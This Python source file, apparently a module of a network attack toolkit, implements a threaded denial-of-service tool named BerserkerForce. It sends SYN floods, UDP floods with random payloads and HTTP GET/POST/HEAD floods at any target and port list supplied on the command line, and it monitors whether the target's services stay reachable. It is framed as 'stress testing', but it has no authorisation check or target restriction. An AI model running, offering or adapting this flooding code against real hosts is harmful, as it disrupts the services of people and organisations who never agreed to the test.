"""berserker_force.py - Network stress testing via SYN/UDP/HTTP floods (scapy-based)."""

import os
import json
import argparse
from datetime import datetime
import logging
import threading
import time
import queue
import socket
import random
import requests
from scapy.all import *
import psutil
from collections import defaultdict

b_class       = "BerserkerForce"
b_module      = "berserker_force"
b_enabled    = 0

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Default settings
DEFAULT_OUTPUT_DIR = "/home/bjorn/Bjorn/data/output/stress"
DEFAULT_SETTINGS_DIR = "/home/bjorn/.settings_bjorn"
SETTINGS_FILE = os.path.join(DEFAULT_SETTINGS_DIR, "berserker_force_settings.json")
DEFAULT_PORTS = [21, 22, 23, 25, 80, 443, 445, 3306, 3389, 5432]

class BerserkerForce:
    def __init__(self, target, ports=None, mode='mixed', rate=100, output_dir=DEFAULT_OUTPUT_DIR):
        self.target = target
        self.ports = ports or DEFAULT_PORTS
        self.mode = mode
        self.rate = rate
        self.output_dir = output_dir
        
        self.active = False
        self.lock = threading.Lock()
        self.packet_queue = queue.Queue()
        
        self.stats = defaultdict(int)
        self.start_time = None
        self.target_resources = {}

    def monitor_target(self):
        """Monitor target's response times and availability."""
        while self.active:
            try:
                for port in self.ports:
                    try:
                        start_time = time.time()
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                            s.settimeout(1)
                            result = s.connect_ex((self.target, port))
                        response_time = time.time() - start_time
                        
                        with self.lock:
                            self.target_resources[port] = {
                                'status': 'open' if result == 0 else 'closed',
                                'response_time': response_time
                            }
                    except:
                        with self.lock:
                            self.target_resources[port] = {
                                'status': 'error',
                                'response_time': None
                            }
                
                time.sleep(1)
            except Exception as e:
                logging.error(f"Error monitoring target: {e}")

    def syn_flood(self):
        """Generate SYN flood packets."""
        while self.active:
            try:
                for port in self.ports:
                    packet = IP(dst=self.target)/TCP(dport=port, flags="S", 
                                                   seq=random.randint(0, 65535))
                    self.packet_queue.put(('syn', packet))
                    with self.lock:
                        self.stats['syn_packets'] += 1
                    
                time.sleep(1/self.rate)
            except Exception as e:
                logging.error(f"Error in SYN flood: {e}")

    def udp_flood(self):
        """Generate UDP flood packets."""
        while self.active:
            try:
                for port in self.ports:
                    data = os.urandom(1024)  # Random payload
                    packet = IP(dst=self.target)/UDP(dport=port)/Raw(load=data)
                    self.packet_queue.put(('udp', packet))
                    with self.lock:
                        self.stats['udp_packets'] += 1
                    
                time.sleep(1/self.rate)
            except Exception as e:
                logging.error(f"Error in UDP flood: {e}")

    def http_flood(self):
        """Generate HTTP flood requests."""
        while self.active:
            try:
                for port in [80, 443]:
                    if port in self.ports:
                        protocol = 'https' if port == 443 else 'http'
                        url = f"{protocol}://{self.target}"
                        
                        # Randomize request type
                        request_type = random.choice(['get', 'post', 'head'])
                        
                        try:
                            if request_type == 'get':
                                requests.get(url, timeout=1)
                            elif request_type == 'post':
                                requests.post(url, data=os.urandom(1024), timeout=1)
                            else:
                                requests.head(url, timeout=1)
                                
                            with self.lock:
                                self.stats['http_requests'] += 1
                                
                        except:
                            with self.lock:
                                self.stats['http_errors'] += 1
                    
                time.sleep(1/self.rate)
            except Exception as e:
                logging.error(f"Error in HTTP flood: {e}")

    def packet_sender(self):
        """Send packets from the queue."""
        while self.active:
            try:
                if not self.packet_queue.empty():
                    packet_type, packet = self.packet_queue.get()
                    send(packet, verbose=False)
                    
                    with self.lock:
                        self.stats['packets_sent'] += 1
                        
                else:
                    time.sleep(0.1)
                    
            except Exception as e:
                logging.error(f"Error sending packet: {e}")

    def calculate_statistics(self):
        """Calculate and update testing statistics."""
        duration = time.time() - self.start_time
        
        stats = {
            'duration': duration,
            'packets_per_second': self.stats['packets_sent'] / duration,
            'total_packets': self.stats['packets_sent'],
            'syn_packets': self.stats['syn_packets'],
            'udp_packets': self.stats['udp_packets'],
            'http_requests': self.stats['http_requests'],
            'http_errors': self.stats['http_errors'],
            'target_resources': self.target_resources
        }
        
        return stats

    def save_results(self):
        """Save test results and statistics."""
        try:
            os.makedirs(self.output_dir, exist_ok=True)
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            
            results = {
                'timestamp': datetime.now().isoformat(),
                'configuration': {
                    'target': self.target,
                    'ports': self.ports,
                    'mode': self.mode,
                    'rate': self.rate
                },
                'statistics': self.calculate_statistics()
            }
            
            output_file = os.path.join(self.output_dir, f"stress_test_{timestamp}.json")
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=4)
                
            logging.info(f"Results saved to {output_file}")
            
        except Exception as e:
            logging.error(f"Failed to save results: {e}")

    def start(self):
        """Start stress testing."""
        self.active = True
        self.start_time = time.time()
        
        threads = []
        
        # Start monitoring thread
        monitor_thread = threading.Thread(target=self.monitor_target)
        monitor_thread.start()
        threads.append(monitor_thread)
        
        # Start sender thread
        sender_thread = threading.Thread(target=self.packet_sender)
        sender_thread.start()
        threads.append(sender_thread)
        
        # Start attack threads based on mode
        if self.mode in ['syn', 'mixed']:
            syn_thread = threading.Thread(target=self.syn_flood)
            syn_thread.start()
            threads.append(syn_thread)
            
        if self.mode in ['udp', 'mixed']:
            udp_thread = threading.Thread(target=self.udp_flood)
            udp_thread.start()
            threads.append(udp_thread)
            
        if self.mode in ['http', 'mixed']:
            http_thread = threading.Thread(target=self.http_flood)
            http_thread.start()
            threads.append(http_thread)
        
        return threads

    def stop(self):
        """Stop stress testing."""
        self.active = False
        self.save_results()

def save_settings(target, ports, mode, rate, output_dir):
    """Save settings to JSON file."""
    try:
        os.makedirs(DEFAULT_SETTINGS_DIR, exist_ok=True)
        settings = {
            "target": target,
            "ports": ports,
            "mode": mode,
            "rate": rate,
            "output_dir": output_dir
        }
        with open(SETTINGS_FILE, 'w') as f:
            json.dump(settings, f)
        logging.info(f"Settings saved to {SETTINGS_FILE}")
    except Exception as e:
        logging.error(f"Failed to save settings: {e}")

def load_settings():
    """Load settings from JSON file."""
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, 'r') as f:
                return json.load(f)
        except Exception as e:
            logging.error(f"Failed to load settings: {e}")
    return {}

def main():
    parser = argparse.ArgumentParser(description="Resource exhaustion testing tool")
    parser.add_argument("-t", "--target", help="Target IP or hostname")
    parser.add_argument("-p", "--ports", help="Ports to test (comma-separated)")
    parser.add_argument("-m", "--mode", choices=['syn', 'udp', 'http', 'mixed'],
                        default='mixed', help="Test mode")
    parser.add_argument("-r", "--rate", type=int, default=100, help="Packets per second")
    parser.add_argument("-o", "--output", default=DEFAULT_OUTPUT_DIR, help="Output directory")
    args = parser.parse_args()

    settings = load_settings()
    target = args.target or settings.get("target")
    ports = [int(p) for p in args.ports.split(',')] if args.ports else settings.get("ports", DEFAULT_PORTS)
    mode = args.mode or settings.get("mode")
    rate = args.rate or settings.get("rate")
    output_dir = args.output or settings.get("output_dir")

    if not target:
        logging.error("Target is required. Use -t or save it in settings")
        return

    save_settings(target, ports, mode, rate, output_dir)

    berserker = BerserkerForce(
        target=target,
        ports=ports,
        mode=mode,
        rate=rate,
        output_dir=output_dir
    )

    try:
        threads = berserker.start()
        logging.info(f"Stress testing started against {target}")
        
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        logging.info("Stopping stress test...")
        berserker.stop()
        for thread in threads:
            thread.join()

if __name__ == "__main__":
    main()